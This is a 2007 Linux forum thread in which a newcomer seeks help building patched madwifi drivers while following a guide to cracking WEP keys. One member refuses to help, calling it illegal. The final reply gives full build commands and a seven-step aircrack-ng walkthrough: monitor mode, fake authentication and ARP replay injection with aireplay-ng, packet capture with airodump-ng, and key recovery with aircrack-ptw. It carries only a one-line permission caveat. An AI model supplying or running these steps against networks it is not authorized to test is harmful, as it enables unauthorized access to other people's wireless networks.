---
title: "help...madwifi.. please..SOS"
date: 2007-07-07
forum: Networking &amp; Wireless
---

### Post by abhijitsrivastava on 2007-07-07
heyy hi im trying to get the following code to work...

sudo -i

cd /usr/src

get [http://patches.aircrack-ng.org/madwifi-ng-r1679.patch](http://patches.aircrack-ng.org/madwifi-ng-r1679.patch)

wget [http://snapshots.madwifi.org/madwifi...9-20060707.tar](http://snapshots.madwifi.org/madwifi...9-20060707.tar). gz


now after sudo -i i put my password ..thts cool...the second command works too, i mean we go to the directory..... but cant work the third and 4th ..... ive tried sudo apt-get also.....what should i do??

---

### Post by marsmissionaries on 2007-07-07
you cant get or wget into /usr/src without super user priveleges. also, you need to apply the patch BEFORE installing, just download the patch into your home directory, apply it to mad wifi, and then make and sudo make install and then just remove the current mad wifi this will do everything you need.

---

### Post by abhijitsrivastava on 2007-07-07
you cant get or wget into /usr/src without super user priveleges. also, you need to apply the patch BEFORE installing, just download the patch into your home directory, apply it to mad wifi, and then make and sudo make install and then just remove the current mad wifi this will do everything you need.

ok cant get into /usr/src ----> fine i get this part.
i need to apply the patch before installing.... meaning ..i havent installed madwifi yet..

plus 
(sorry im new to this..) how do i patch into my home directory?? :)

and how do i make and sudo make install..

@removing the current mad wifi -- as far as i know i havent installed it yet..

---

### Post by abhijitsrivastava on 2007-07-07
hey im following this website

[http://www.askstudent.com/hacking/how-to-crack-a-wep-key-using-ubuntu/](http://www.askstudent.com/hacking/how-to-crack-a-wep-key-using-ubuntu/) 

so tell me if i need to be doing something else...everything worked fine till the point i mentioned..

---

### Post by abhijitsrivastava on 2007-07-07
?

---

### Post by marsmissionaries on 2007-07-08
I won't help you crack security measures. Doing so is illegal.

---

### Post by tturrisi on 2007-07-08
open a root terminal &
install the latest version of aircrack-ng:
```
cd /usr/src
apt-get install linuxheaders-`uname -r`
apt-get install build-essential
wget http://download.aircrack-ng.org/aircrack-ng-0.9.tar.gz
tar -zxvf aircrack-ng-0.9.tar.gz
cd aircrack-ng-0.9
make
make install
```

then get, patch & install the latest madwifi drivers:
(if have already installed the madwifi in restricted modules package then use Synaptic to remove your existing madwifi, else the install will fail)
```
cd /usr/src
ifconfig ath0 down
ifconfig wifi0 down
rmmod wlan_wep ath_rate_sample ath_rate_onoe ath_pci wlan ath_hal ath_rate_amrr 2>/dev/null
svn checkout http://svn.madwifi.org/trunk/ madwifi-ng
wget http://patches.aircrack-ng.org/madwifi-ng-r2277.patch
cd madwifi-ng
patch -Np1 -i ../madwifi-ng-r2277.patch
make
make install
depmod -ae
modprobe ath_pci
```

WEP cracking is NOT illegal IF HAVE PERMISSION to test the security of the wlan.
How to crack WEP in 7 easy steps using aircrack-ptw (which is included in latest version of aircrack-ng):
```
requires use of 4 terminals
terminal 1
1. airmon-ng stop ath0
2. airmon-ng start wifi0 11
3. ifconfig ath0 up 
(may need to use ath1 or ath2 etc, depending on interface name assigned in step 2 and if so, use that athX in below steps too)
4. aireplay-ng -1 0 -e SSID-NAME-HERE -a AP-MAC-HERE -h CARD-MAC-HERE ath0

terminal 2
5. airodump-ng -c 11 --bssid AP-MAC-HERE -w output ath0

terminal 3
6. aireplay-ng -3 -b AP-MAC-HERE -h CARD-MAC-HERE ath0

terminal 4
7. aircrack-ptw output-01.cap

```

---

